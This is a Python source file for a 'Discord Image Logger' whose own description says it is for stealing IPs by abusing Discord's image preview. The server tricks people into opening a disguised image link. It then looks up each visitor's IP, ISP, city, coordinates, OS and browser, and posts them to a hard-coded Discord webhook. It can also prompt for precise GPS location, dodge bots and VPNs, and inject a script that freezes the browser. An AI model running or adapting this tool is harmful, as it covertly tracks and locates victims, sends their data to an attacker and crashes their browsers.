# Discord Image Logger
# By DeKrypt | https://github.com/dekrypted

from http.server import BaseHTTPRequestHandler
from urllib import parse
import traceback, requests, base64, httpagentparser

__app__ = "Discord Image Logger"
__description__ = "A simple application which allows you to steal IPs and more by abusing Discord's Open Original feature"
__version__ = "v2.0"
__author__ = "DeKrypt"

config = {
    # BASE CONFIG #
    "webhook": "https://discord.com/api/webhooks/1201095980565676083/5lO83VomOnOKMWpKIY0yOCK-XO4Cix4MM6hbm1tkvwpjTEWDpupdGA-j9GTW93fePtHI
",
    "image":data:image/jpeg;base64,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
"https://www.google.com/url?sa=i&url=https%3A%2F%2Fwww.thegamegal.com%2F2018%2F09%2F01%2Fultimate-tic-tac-toe%2F&psig=AOvVaw2kMx8dBdXkbwh3CgRzaAVC&ust=1706520504621000&source=images&cd=vfe&opi=89978449&ved=0CBMQjRxqFwoTCPjj0Y3j_4MDFQAAAAAdAAAAABAD
", # You can also have a custom image by using a URL argument
                                               # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
    "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)

    # CUSTOMIZATION #
    "username": "Image Logger", # Set this to the name you want the webhook to have
    "color": 0x00FFFF, # Hex Color you want for the embed (Example: Red is 0xFF0000)

    # OPTIONS #
    "crashBrowser": False, # Tries to crash/freeze the user's browser, may not work. (I MADE THIS, SEE https://github.com/dekrypted/Chromebook-Crasher)
    
    "accurateLocation": False, # Uses GPS to find users exact location (Real Address, etc.) disabled because it asks the user which may be suspicious.

    "message": { # Show a custom message when the user opens the image
        "doMessage": False, # Enable the custom message?
        "message": "This browser has been pwned by DeKrypt's Image Logger. https://github.com/dekrypted/Discord-Image-Logger", # Message to show
        "richMessage": True, # Enable rich text? (See README for more info)
    },

    "vpnCheck": 1, # Prevents VPNs from triggering the alert
                # 0 = No Anti-VPN
                # 1 = Don't ping when a VPN is suspected
                # 2 = Don't send an alert when a VPN is suspected

    "linkAlerts": True, # Alert when someone sends the link (May not work if the link is sent a bunch of times within a few minutes of each other)
    "buggedImage": True, # Shows a loading image as the preview when sent in Discord (May just appear as a random colored image on some devices)

    "antiBot": 1, # Prevents bots from triggering the alert
                # 0 = No Anti-Bot
                # 1 = Don't ping when it's possibly a bot
                # 2 = Don't ping when it's 100% a bot
                # 3 = Don't send an alert when it's possibly a bot
                # 4 = Don't send an alert when it's 100% a bot
    

    # REDIRECTION #
    "redirect": {
        "redirect": False, # Redirect to a webpage?
        "page": "https://your-link.here" # Link to the webpage to redirect to 
    },

    # Please enter all values in correct format. Otherwise, it may break.
    # Do not edit anything below this, unless you know what you're doing.
    # NOTE: Hierarchy tree goes as follows:
    # 1) Redirect (If this is enabled, disables image and crash browser)
    # 2) Crash Browser (If this is enabled, disables image)
    # 3) Message (If this is enabled, disables image)
    # 4) Image 
}

blacklistedIPs = ("27", "104", "143", "164") # Blacklisted IPs. You can enter a full IP or the beginning to block an entire block.
                                                           # This feature is undocumented mainly due to it being for detecting bots better.

def botCheck(ip, useragent):
    if ip.startswith(("34", "35")):
        return "Discord"
    elif useragent.startswith("TelegramBot"):
        return "Telegram"
    else:
        return False

def reportError(error):
    requests.post(config["webhook"], json = {
    "username": config["username"],
    "content": "@everyone",
    "embeds": [
        {
            "title": "Image Logger - Error",
            "color": config["color"],
            "description": f"An error occurred while trying to log an IP!\n\n**Error:**\n```\n{error}\n```",
        }
    ],
})

def makeReport(ip, useragent = None, coords = None, endpoint = "N/A", url = False):
    if ip.startswith(blacklistedIPs):
        return
    
    bot = botCheck(ip, useragent)
    
    if bot:
        requests.post(config["webhook"], json = {
    "username": config["username"],
    "content": "",
    "embeds": [
        {
            "title": "Image Logger - Link Sent",
            "color": config["color"],
            "description": f"An **Image Logging** link was sent in a chat!\nYou may receive an IP soon.\n\n**Endpoint:** `{endpoint}`\n**IP:** `{ip}`\n**Platform:** `{bot}`",
        }
    ],
}) if config["linkAlerts"] else None # Don't send an alert if the user has it disabled
        return

    ping = "@everyone"

    info = requests.get(f"http://ip-api.com/json/{ip}?fields=16976857").json()
    if info["proxy"]:
        if config["vpnCheck"] == 2:
                return
        
        if config["vpnCheck"] == 1:
            ping = ""
    
    if info["hosting"]:
        if config["antiBot"] == 4:
            if info["proxy"]:
                pass
            else:
                return

        if config["antiBot"] == 3:
                return

        if config["antiBot"] == 2:
            if info["proxy"]:
                pass
            else:
                ping = ""

        if config["antiBot"] == 1:
                ping = ""


    os, browser = httpagentparser.simple_detect(useragent)
    
    embed = {
    "username": config["username"],
    "content": ping,
    "embeds": [
        {
            "title": "Image Logger - IP Logged",
            "color": config["color"],
            "description": f"""**A User Opened the Original Image!**

**Endpoint:** `{endpoint}`
            
**IP Info:**
> **IP:** `{ip if ip else 'Unknown'}`
> **Provider:** `{info['isp'] if info['isp'] else 'Unknown'}`
> **ASN:** `{info['as'] if info['as'] else 'Unknown'}`
> **Country:** `{info['country'] if info['country'] else 'Unknown'}`
> **Region:** `{info['regionName'] if info['regionName'] else 'Unknown'}`
> **City:** `{info['city'] if info['city'] else 'Unknown'}`
> **Coords:** `{str(info['lat'])+', '+str(info['lon']) if not coords else coords.replace(',', ', ')}` ({'Approximate' if not coords else 'Precise, [Google Maps]('+'https://www.google.com/maps/search/google+map++'+coords+')'})
> **Timezone:** `{info['timezone'].split('/')[1].replace('_', ' ')} ({info['timezone'].split('/')[0]})`
> **Mobile:** `{info['mobile']}`
> **VPN:** `{info['proxy']}`
> **Bot:** `{info['hosting'] if info['hosting'] and not info['proxy'] else 'Possibly' if info['hosting'] else 'False'}`

**PC Info:**
> **OS:** `{os}`
> **Browser:** `{browser}`

**User Agent:**
```
{useragent}
```""",
    }
  ],
}
    
    if url: embed["embeds"][0].update({"thumbnail": {"url": url}})
    requests.post(config["webhook"], json = embed)
    return info

binaries = {
    "loading": base64.b85decode(b'|JeWF01!$>Nk#wx0RaF=07w7;|JwjV0RR90|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|Nq+nLjnK)|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsBO01*fQ-~r$R0TBQK5di}c0sq7R6aWDL00000000000000000030!~hfl0RR910000000000000000RP$m3<CiG0uTcb00031000000000000000000000000000')
    # This IS NOT a rat or virus, it's just a loading image. (Made by me! :D)
    # If you don't trust it, read the code or don't use this at all. Please don't make an issue claiming it's duahooked or malicious.
    # You can look at the below snippet, which simply serves those bytes to any client that is suspected to be a Discord crawler.
}

class ImageLoggerAPI(BaseHTTPRequestHandler):
    
    def handleRequest(self):
        try:
            if config["imageArgument"]:
                s = self.path
                dic = dict(parse.parse_qsl(parse.urlsplit(s).query))
                if dic.get("url") or dic.get("id"):
                    url = base64.b64decode(dic.get("url") or dic.get("id").encode()).decode()
                else:
                    url = config["image"]
            else:
                url = config["image"]

            data = f'''<style>body {{
margin: 0;
padding: 0;
}}
div.img {{
background-image: url('{url}');
background-position: center center;
background-repeat: no-repeat;
background-size: contain;
width: 100vw;
height: 100vh;
}}</style><div class="img"></div>'''.encode()
            
            if self.headers.get('x-forwarded-for').startswith(blacklistedIPs):
                return
            
            if botCheck(self.headers.get('x-forwarded-for'), self.headers.get('user-agent')):
                self.send_response(200 if config["buggedImage"] else 302) # 200 = OK (HTTP Status)
                self.send_header('Content-type' if config["buggedImage"] else 'Location', 'image/jpeg' if config["buggedImage"] else url) # Define the data as an image so Discord can show it.
                self.end_headers() # Declare the headers as finished.

                if config["buggedImage"]: self.wfile.write(binaries["loading"]) # Write the image to the client.

                makeReport(self.headers.get('x-forwarded-for'), endpoint = s.split("?")[0], url = url)
                
                return
            
            else:
                s = self.path
                dic = dict(parse.parse_qsl(parse.urlsplit(s).query))

                if dic.get("g") and config["accurateLocation"]:
                    location = base64.b64decode(dic.get("g").encode()).decode()
                    result = makeReport(self.headers.get('x-forwarded-for'), self.headers.get('user-agent'), location, s.split("?")[0], url = url)
                else:
                    result = makeReport(self.headers.get('x-forwarded-for'), self.headers.get('user-agent'), endpoint = s.split("?")[0], url = url)
                

                message = config["message"]["message"]

                if config["message"]["richMessage"] and result:
                    message = message.replace("{ip}", self.headers.get('x-forwarded-for'))
                    message = message.replace("{isp}", result["isp"])
                    message = message.replace("{asn}", result["as"])
                    message = message.replace("{country}", result["country"])
                    message = message.replace("{region}", result["regionName"])
                    message = message.replace("{city}", result["city"])
                    message = message.replace("{lat}", str(result["lat"]))
                    message = message.replace("{long}", str(result["lon"]))
                    message = message.replace("{timezone}", f"{result['timezone'].split('/')[1].replace('_', ' ')} ({result['timezone'].split('/')[0]})")
                    message = message.replace("{mobile}", str(result["mobile"]))
                    message = message.replace("{vpn}", str(result["proxy"]))
                    message = message.replace("{bot}", str(result["hosting"] if result["hosting"] and not result["proxy"] else 'Possibly' if result["hosting"] else 'False'))
                    message = message.replace("{browser}", httpagentparser.simple_detect(self.headers.get('user-agent'))[1])
                    message = message.replace("{os}", httpagentparser.simple_detect(self.headers.get('user-agent'))[0])

                datatype = 'text/html'

                if config["message"]["doMessage"]:
                    data = message.encode()
                
                if config["crashBrowser"]:
                    data = message.encode() + b'<script>setTimeout(function(){for (var i=69420;i==i;i*=i){console.log(i)}}, 100)</script>' # Crasher code by me! https://github.com/dekrypted/Chromebook-Crasher

                if config["redirect"]["redirect"]:
                    data = f'<meta http-equiv="refresh" content="0;url={config["redirect"]["page"]}">'.encode()
                self.send_response(200) # 200 = OK (HTTP Status)
                self.send_header('Content-type', datatype) # Define the data as an image so Discord can show it.
                self.end_headers() # Declare the headers as finished.

                if config["accurateLocation"]:
                    data += b"""<script>
var currenturl = window.location.href;

if (!currenturl.includes("g=")) {
    if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(function (coords) {
    if (currenturl.includes("?")) {
        currenturl += ("&g=" + btoa(coords.coords.latitude + "," + coords.coords.longitude).replace(/=/g, "%3D"));
    } else {
        currenturl += ("?g=" + btoa(coords.coords.latitude + "," + coords.coords.longitude).replace(/=/g, "%3D"));
    }
    location.replace(currenturl);});
}}

</script>"""
                self.wfile.write(data)
        
        except Exception:
            self.send_response(500)
            self.send_header('Content-type', 'text/html')
            self.end_headers()

            self.wfile.write(b'500 - Internal Server Error <br>Please check the message sent to your Discord Webhook and report the error on the GitHub page.')
            reportError(traceback.format_exc())

        return
    
    do_GET = handleRequest
    do_POST = handleRequest

handler = app = ImageLoggerAPI
